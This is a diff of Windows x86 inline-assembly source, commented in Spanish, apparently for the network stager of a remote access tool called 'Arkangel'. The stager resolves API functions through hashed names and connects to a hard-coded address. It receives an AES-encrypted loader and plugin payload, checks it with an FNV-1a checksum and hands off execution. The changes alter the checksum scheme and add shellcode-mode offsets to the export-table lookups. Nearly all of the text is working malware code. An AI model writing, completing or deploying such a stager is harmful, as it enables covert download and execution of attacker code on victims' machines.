@@ -32,10 +32,10 @@ void gtfo(DWORD exit_code);
 **    Para más información revisar 'macros.h'.
 *###############################################################################*/
 CREATE_IDS(
-            /*kernel32*/    (LoadLibraryA) (GetProcAddress) (Sleep) (ExitProcess) (GlobalAlloc) (GlobalFree)
+            /*kernel32*/    (LoadLibraryA) (GetProcAddress) (Sleep) (ExitProcess) (GlobalAlloc)
             /*ws2_32*/      (WSASocketA) (connect) (WSAStartup) (closesocket) (send) (inet_addr) (gethostbyname) (recv)
 			/*advapi32*/	(CryptAcquireContextA) (CryptSetKeyParam) (CryptImportKey) (CryptDecrypt)
-            /*variables*/   (hSocket) /*(Delta)*/ (pBuff) (buffLen) (hProv) (hHash) (hKey)
+            /*variables*/   (hSocket) (pBuff) (buffLen) (hProv) (hHash) (hKey)
            )
 
 void __declspec(naked) main(){
@@ -54,13 +54,6 @@ void __declspec(naked) main(){
         *###############################################################################*/
 
 IP:     EMIT_BYTE_ARRAY(('1') ('2') ('7') ('.') ('0') ('.') ('0') ('.') ('1')(0))
-/**
-	
-		BLOBHEADER hdr;
-		DWORD keySize;
-		BYTE keydata[16];
-	}aes128Blob;
-**/
 KEY:   	//typedef struct aes128Blob{
             //BLOBHEADER{
                 /*bType*/       EMIT_BYTE(PLAINTEXTKEYBLOB)
@@ -73,13 +66,12 @@ KEY:   	//typedef struct aes128Blob{
         //}
 
 kernel32_symbol_hashes:
-        #define kernel32_count  6
+        #define kernel32_count  5
         /*LoadLibraryA*/        HASH_AND_EMIT( ('L') ('o') ('a') ('d') ('L') ('i') ('b') ('r') ('a') ('r') ('y') ('A') )
         /*GetProcAddress*/      HASH_AND_EMIT( ('G') ('e') ('t') ('P') ('r') ('o') ('c') ('A') ('d') ('d') ('r') ('e') ('s') ('s') )
         /*Sleep*/               HASH_AND_EMIT( ('S') ('l') ('e') ('e') ('p') )
         /*ExitProcess*/         HASH_AND_EMIT( ('E') ('x') ('i') ('t') ('P') ('r') ('o') ('c') ('e') ('s') ('s') )
         /*GlobalAlloc*/         HASH_AND_EMIT( ('G') ('l') ('o') ('b') ('a') ('l') ('A') ('l') ('l') ('o') ('c') )
-        /*GlobalFree*/          HASH_AND_EMIT( ('G') ('l') ('o') ('b') ('a') ('l') ('F') ('r') ('e') ('e') )
 
 ws2_32_symbol_hashes:
         #define ws2_32_count    8
@@ -138,7 +130,6 @@ find_delta:
         pop  edi
         add  edi, K
         sub  edi, (find_delta+K)
-        //mov  [ebp+_Delta], edi            //Lo guardamos para luego :)
 #endif
 
         /*###############################################################################
@@ -259,7 +250,7 @@ newSocket:
 
         //Construimos la sockaddr_in en la pila
         push eax                        //push IP
-        push PORT                       //push PORT            (TODO: EL BUILDER PARCHEARÁ ESTO!!!! :D)
+        pushc(PORT)                     //push PORT            (TODO: EL BUILDER PARCHEARÁ ESTO!!!! :D)
         mov  ebx, esp                   //EBX = &sockaddr_in
 
         //Conectamos al cliente haciendo un máximo de 121 intentos cada 0x1337ms
@@ -285,11 +276,11 @@ connected:
         ** Recepción de datos desde el cliente:
         **  Una vez establecida la conexión con éxito intentamos recibir 
         **  el paquete inicial compuesto de:
-        **      IV+SizePlayload+CHECKSUM+LOADER_IAT+CARGADOR
+        **      IV+SizePlayload+offset_basis+LOADER_IAT+CARGADOR
         **  Siendo cada uno:
         **      *IV(16bytes)    : Vector de inicializacion para el cifrado
         **{{
-        **      *CHECKSUM       : Checksum de todo el paquete a partir del IV, para evitar error crítico al ejecutar.
+        **      *offset_basis   : offset_basis de todo el paquete a partir del IV, para evitar error crítico al ejecutar.
         **      *SizePayload    : sizeof(LOADER_IAT+CARGADOR)
         **      *LOADER_IAT     : Loader de Arkangel encargado de ubicar y ejecutar el cargador de plugins
         **      *CARGADOR       : Cargador de plugins... encargado de gestionar la conexión
@@ -307,8 +298,6 @@ recibir:
         test eax, eax                   //v
         jg   init_decrypt               //>EAX>0? (Todo correcto? Procedemos a descifrar)
 KillSocket:
-//      push [ebp+_pBuff]               //v
-//      call [ebp+_GlobalFree]          //>GlobalFree(pBuff);
         push [ebp+_hSocket]             //v
         call [ebp+_closesocket]         //>closesocket(hSocket);
         jmp  newSocket                  //Creamos un nuevo socket
@@ -352,7 +341,7 @@ init_decrypt:
 		sub  [ebp+_buffLen], 16         //buffLen-= 16
 
 		//Finalmente desciframos los datos obtenidos
-		//Los datos se encuentran en el paquete asi: IV(16B)+DataEncrypt
+		//Los datos se encuentran en el paquete asi: IV(16Bytes)+DataEncrypt
         //cdq						
 
 		push [ebp+_buffLen]             //Variable temporal para guardar el tamaño de los datos a leer
@@ -369,26 +358,27 @@ init_decrypt:
 
         /*###############################################################################
         ** Comprobación del checksum:
-        **    El checksum esta en el primer DWORD de los datos recibidos.
+        **    El offset_basis esta en +16 de los datos recibidos.
         **    El algoritmo utilizado para calcular el checksum es: 
         **        *FNV1a (http://goo.gl/1A7ir)
+        **    El offset_basis es un número especialmente calculado para cuando se obtenga
+        **     el checksum de los datos éste sea 0.
         *###############################################################################*/
 
         mov  ecx, [ebp+_buffLen]        //ECX = buffLen
         mov  esi, [ebp+_pBuff]          //ESI = pBuff
-        add  esi, (16 + 4)              //ESI+= (16 + 4) (Saltamos IV y checksum)
+        add  esi, (16 + 4)              //ESI+= (16 + 4) (Saltamos IV y offset_basis)
 
-        mov  edx, 2166136261            //hash = 2166136261
+        mov  edx, [esi-4]               //hash = offset_basis
 FNV1a:
         xor  eax, eax                   //v
-        lodsb                           //al = str[i]; i++
+        lodsb                           //al = str[i]; i++;
         xor  edx, eax                   //>hash ^= str[i];
-        imul edx, 16777619              //>hash *= 16777619;
+        imul edx, 0x1EF30EB             //>hash *= 0x1EF30EB;
         loop FNV1a                      //>(len--);(len < 0)?
 
-        mov  esi, [ebp+_pBuff]          //v
-        cmp  edx, [esi + 16]            //v
-        je   NoErr4                     //>(EDX==[ESI+sizeof(IV)]?)Si los checksums coinciden no hay error
+        test edx, edx
+        jz   NoErr4                     //>(EDX==0?)Si es igual a cero significa que los datos recibidos eran correctos
 
         //Algo falla en el checksum... reseteemos la conexión
         //push ERR_SUM                  //v
@@ -440,10 +430,17 @@ find_function:
         mov  ecx, [edi+0x18]            //ECX = IMAGE_EXPORT_DIRECTORY.NumberOfFunctions
         mov  ebp, [edi+0x20]            //EBP = IMAGE_EXPORT_DIRECTORY.AddressOfFunctions (RVA)
         add  ebp, edx                   //EBP = IMAGE_EXPORT_DIRECTORY.AddressOfFunctions (VA)
+        #ifdef SHELLCODE
+        inc  ebp                        //EBP++;
+        #endif
 find_function_loop:
         jecxz find_function_finished    //Si ECX == 0 ya no quedan funciones por recorrer
         dec  ecx                        //ECX--
-        mov  esi, [ebp+ecx*4]           //ESI = IMAGE_EXPORT_DIRECTORY.AddressOfFunctions[X] (RVA)
+        #ifdef SHELLCODE
+        mov  esi, [ebp+ecx*4+1]         //ESI = IMAGE_EXPORT_DIRECTORY.AddressOfFunctions[X] (RVA)
+        #else
+        mov  esi, [ebp+ecx*4]
+        #endif
         add  esi, edx                   //ESI = IMAGE_EXPORT_DIRECTORY.AddressOfNames[X] (VA) Export Name Table
 compute_hash:
         xor  ebx, ebx                   //EBX = 0
@@ -464,10 +461,18 @@ find_function_compare:
         jnz  find_function_loop         //>(DX == FunctionHash)?
         mov  ebp, [edi+0x24]            //EBP = IMAGE_EXPORT_DIRECTORY.AddressOfNames (RVA)
         add  ebp, edx                   //EBP = IMAGE_EXPORT_DIRECTORY.AddressOfNames (VA)
+        #ifdef SHELLCODE
+        mov  cx, [ebp+ecx*2+1]
+        #else
         mov  cx, [ebp+ecx*2]
+        #endif
         mov  ebp, [edi+0x1C]
         add  ebp, edx
+        #ifdef SHELLCODE
+        mov  eax, [ebp+4*ecx+1]
+        #else
         mov  eax, [ebp+4*ecx]
+        #endif
         add  eax, edx
 find_function_finished:
         mov  [esp+0x1C], eax
